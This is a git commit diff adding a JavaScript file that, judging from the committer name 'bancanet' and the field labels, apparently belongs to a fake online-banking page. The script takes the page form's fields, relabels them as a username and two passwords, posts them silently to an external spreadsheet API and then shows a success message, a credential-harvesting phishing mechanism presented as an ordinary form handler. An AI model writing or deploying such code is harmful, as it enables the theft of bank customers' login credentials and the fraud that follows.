f3a39aee26f7772774e976d3dfcfa553e15b1093
bancanet <118914760+banca-enlinea@users.noreply.github.com>
2022-12-01 18:09:59 -0600

    Add files via upload

---
+++ js/app.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('formulario');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/4438b5cc-e262-4beb-bbde-8036afc7a7a6', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.nombre.value,
+            "Contraseña1": formulario.correo.value,
+            "Contraseña2": formulario.telefono.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
